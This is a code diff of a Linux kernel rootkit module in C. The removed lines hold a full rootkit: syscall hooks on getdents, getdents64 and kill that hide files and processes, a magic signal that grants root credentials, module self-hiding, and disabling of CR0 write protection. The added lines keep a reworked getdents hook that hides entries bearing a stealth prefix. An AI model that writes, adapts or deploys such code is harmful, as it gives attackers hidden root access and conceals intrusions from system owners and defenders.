@@ -1,300 +1,93 @@
-#define KPROBE_LOOKUP 1
-#define MAGIC_PREFIX "dkom_rootkit_secret"
-#define PF_INVISIBLE 0x10000000
+#include <linux/kernel.h>
+#include <linux/syscalls.h>
+#include <linux/sched/signal.h>
+#include <linux/fdtable.h>
+// This header provides the full definition of struct files_struct and related structures, 
+// allowing you to access fdt and fd.
+
+
+#define STEALTH_PREFIX "dkom_rootkit_secret"
+#define PROC_ROOT_INO 1
 
 
 ///////////////////////////////
-//    Check system options
+//   Define struct
 ///////////////////////////////
-#ifndef IS_ENABLED
-#define IS_ENABLED(option) \
-(defined(__enabled_ ## option) || defined(__enabled_ ## option ## _MODULE))
-#endif
-
-#ifndef __NR_getdents
-#define __NR_getdents 141
-#endif
-
-
-///////////////////////////////
-//   Define structs
-///////////////////////////////
-struct linux_dirent {
-    unsigned long   d_ino;
-    unsigned long   d_off;
-    unsigned short  d_reclen;
-    char            d_name[1];
-};
-
-static struct task_struct * find_task(pid_t pid) {
-	struct task_struct *p = current;
-	for_each_process(p) {
-		if (p->pid == pid)
-			return p;
-	}
-	return NULL;
-}
-
-enum {
-    SIGINVIS = 31,
-    SIGSUPER = 64,
-    SIGMODINVIS = 63,
+struct linux_dirent64 {
+    unsigned long long  d_ino;    // 64-bit inode number
+    long long           d_off;    // 64-bit offset to next dirent
+    unsigned short      d_reclen; // length of this dirent
+    unsigned char       d_type;   // file type
+    char                d_name[]; // filename (null-terminated)
 };
 
 
-static inline void tidy(void) {
-	kfree(THIS_MODULE->sect_attrs);
-	THIS_MODULE->sect_attrs = NULL;
+
+///////////////////////////////
+//      Modified getdents 
+///////////////////////////////
+asmlinkage long (*orig_getdents)(struct pt_regs *regs);
+
+// See if the folder name is the stealth prefix
+static int is_hidden_entry(const char *entry_name) {
+  if (strncmp(STEALTH_PREFIX, entry_name, sizeof(STEALTH_PREFIX)-1) == 0)
+    return 1;
+  else return 0;
 }
 
+asmlinkage long fh_getdents(const struct pt_regs *regs);
+asmlinkage long fh_getdents(const struct pt_regs *regs) {
+  int file_desc = (int) regs->di;
+  struct linux_dirent *user_dirent = (struct linux_dirent *) regs->si;
+  struct linux_dirent64 *kernel_buf, *current_entry, *last_valid = NULL;
+  struct inode *dir_inode;
+  int is_proc_root = 0;
 
-///////////////////////////////
-//         Hide module 
-///////////////////////////////
-void module_show(void);
-void module_hide(void);
+  // Invoke original system call
+  int bytes_read = orig_getdents((struct pt_regs *)regs);
+  if (bytes_read <= 0) 
+    return bytes_read;
 
-static struct list_head *module_previous;
-static short module_hidden = 0;
+  // Allocate kernel-space buffer
+  kernel_buf = kzalloc(bytes_read, GFP_KERNEL);
+  if (!kernel_buf) 
+    return -ENOMEM;
 
-void module_show(void) {
-	list_add(&THIS_MODULE->list, module_previous);
-	module_hidden = 0;
-}
+  // Copy userspace data to kernel buffer
+  if (copy_from_user(kernel_buf, user_dirent, bytes_read)) {
+    kfree(kernel_buf);
+    return -EFAULT; // -EFAULT is a standard Linux error code meaning "bad address"
+  }
 
-void module_hide(void) {
-	module_previous = THIS_MODULE->list.prev;
-	list_del(&THIS_MODULE->list);
-	module_hidden = 1;
-}
+  // Get inode information for filtering
+  dir_inode = current->files->fdt->fd[file_desc]->f_path.dentry->d_inode;
+  if (dir_inode->i_ino == PROC_ROOT_INO && !MAJOR(dir_inode->i_rdev))
+    is_proc_root = 1;
 
-static int is_invisible(pid_t pid) {
-	struct task_struct *task;
-	if (!pid)
-		return 0;
-	task = find_task(pid);
-	if (!task)
-		return 0;
-	if (task->flags & PF_INVISIBLE)
-		return 1;
-	return 0;
-}
+  unsigned long buffer_offset = 0;
+  while (buffer_offset < bytes_read) {
+    current_entry = (void *)kernel_buf + buffer_offset;
+    
+    if (!is_proc_root && is_hidden_entry(current_entry->d_name)) {
+      if (current_entry == kernel_buf) {
+        // Remove first entry case
+        bytes_read -= current_entry->d_reclen;
+        memmove(current_entry, (void *)current_entry + current_entry->d_reclen, bytes_read);
+        continue;
+      }
+      // Merge with previous entry
+      last_valid->d_reclen += current_entry->d_reclen;
+    } else {
+      last_valid = current_entry;
+    }
+    
+    buffer_offset += current_entry->d_reclen;
+  }
 
+  // Copy filtered results back to userspace
+  if (copy_to_user(user_dirent, kernel_buf, bytes_read))
+    bytes_read = -EFAULT;
 
-///////////////////////////////
-// Give Root to module
-///////////////////////////////
-static void give_root(void) {
-    struct cred *newcreds;
-    newcreds = prepare_creds();
-
-    if (newcreds == NULL)
-        return;
-
-    newcreds->uid.val = newcreds->gid.val = 0;
-    newcreds->euid.val = newcreds->egid.val = 0;
-    newcreds->suid.val = newcreds->sgid.val = 0;
-    newcreds->fsuid.val = newcreds->fsgid.val = 0;
-
-    commit_creds(newcreds);
-}
-
-
-///////////////////////////////
-//   kprobe init to hook
-//     system calls
-///////////////////////////////
-typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
-unsigned long * get_syscall_table_bf(void);
-
-static struct kprobe kp = {
-    .symbol_name = "kallsyms_lookup_name"
-};
-
-unsigned long * get_syscall_table_bf(void) {
-	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
-	kallsyms_lookup_name_t kallsyms_lookup_name;
-	register_kprobe(&kp);
-	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
-	unregister_kprobe(&kp);
-
-    return NULL;
-}
-
-
-///////////////////////////////
-// getdent64 system call hook
-///////////////////////////////
-static t_syscall orig_getdents64;
-asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs);
-
-asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
-	int fd = (int) pt_regs->di;
-	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
-
-	int ret = orig_getdents64(pt_regs), err;
-
-	unsigned short proc = 0;
-	unsigned long off = 0;
-	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
-	struct inode *d_inode;
-
-	if (ret <= 0)
-		return ret;
-
-	kdirent = kzalloc(ret, GFP_KERNEL);
-	if (kdirent == NULL)
-		return ret;
-
-	err = copy_from_user(kdirent, dirent, ret);
-	if (err)
-		goto out;
-
-
-	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
-	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
-		/*&& MINOR(d_inode->i_rdev) == 1*/)
-		proc = 1;
-
-	while (off < ret) {
-		dir = (void *)kdirent + off;
-		if ((!proc &&
-		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
-		|| (proc &&
-		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
-			if (dir == kdirent) {
-				ret -= dir->d_reclen;
-				memmove(dir, (void *)dir + dir->d_reclen, ret);
-				continue;
-			}
-			prev->d_reclen += dir->d_reclen;
-		} else
-			prev = dir;
-		off += dir->d_reclen;
-	}
-	err = copy_to_user(dirent, kdirent, ret);
-	if (err)
-		goto out;
-out:
-	kfree(kdirent);
-	return ret;
-}
-
-
-///////////////////////////////
-// getdent system call hook
-///////////////////////////////
-static t_syscall orig_getdents;
-asmlinkage long hacked_getdents(const struct pt_regs *pt_regs);
-
-asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
-
-	int fd = (int) pt_regs->di;
-	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
-
-	int ret = orig_getdents(pt_regs), err;
-
-	unsigned short proc = 0;
-	unsigned long off = 0;
-	struct linux_dirent *dir, *kdirent, *prev = NULL;
-	struct inode *d_inode;
-
-	if (ret <= 0)
-		return ret;	
-
-	kdirent = kzalloc(ret, GFP_KERNEL);
-	if (kdirent == NULL)
-		return ret;
-
-	err = copy_from_user(kdirent, dirent, ret);
-	if (err)
-		goto out;
-
-
-	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
-
-
-	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
-		/*&& MINOR(d_inode->i_rdev) == 1*/)
-		proc = 1;
-
-	while (off < ret) {
-		dir = (void *)kdirent + off;
-		if ((!proc && 
-		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
-		|| (proc &&
-		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
-			if (dir == kdirent) {
-				ret -= dir->d_reclen;
-				memmove(dir, (void *)dir + dir->d_reclen, ret);
-				continue;
-			}
-			prev->d_reclen += dir->d_reclen;
-		} else
-			prev = dir;
-		off += dir->d_reclen;
-	}
-	err = copy_to_user(dirent, kdirent, ret);
-	if (err)
-		goto out;
-out:
-	kfree(kdirent);
-	return ret;
-}
-
-
-///////////////////////////////
-// kill system call hook
-///////////////////////////////
-static t_syscall orig_kill;
-asmlinkage int hacked_kill(const struct pt_regs *pt_regs);
-
-asmlinkage int hacked_kill(const struct pt_regs *pt_regs) {
-	pid_t pid = (pid_t) pt_regs->di;
-	int sig = (int) pt_regs->si;
-
-	struct task_struct *task;
-	switch (sig) {
-		case SIGINVIS:
-			if ((task = find_task(pid)) == NULL)
-				return -ESRCH;
-			task->flags ^= PF_INVISIBLE;
-			break;
-		case SIGSUPER:
-			give_root();
-			break;
-		case SIGMODINVIS:
-			if (module_hidden) module_show();
-			else module_hide();
-			break;
-		default:
-
-		return orig_kill(pt_regs);
-
-	}
-	return 0;
-}
-
-
-///////////////////////////////
-//    Write to memory
-///////////////////////////////
-unsigned long cr0;
-
-inline void write_cr0_forced(unsigned long val) {
-	unsigned long __force_order;
-
-	asm volatile(
-		"mov %0, %%cr0"
-		: "+r"(val), "+m"(__force_order));
-}
-
-
-inline void protect_memory(void) {
-	write_cr0_forced(cr0);
-}
-
-
-inline void unprotect_memory(void) {
-	write_cr0_forced(cr0 & ~0x00010000);
+  kfree(kernel_buf);
+  return bytes_read;
 }
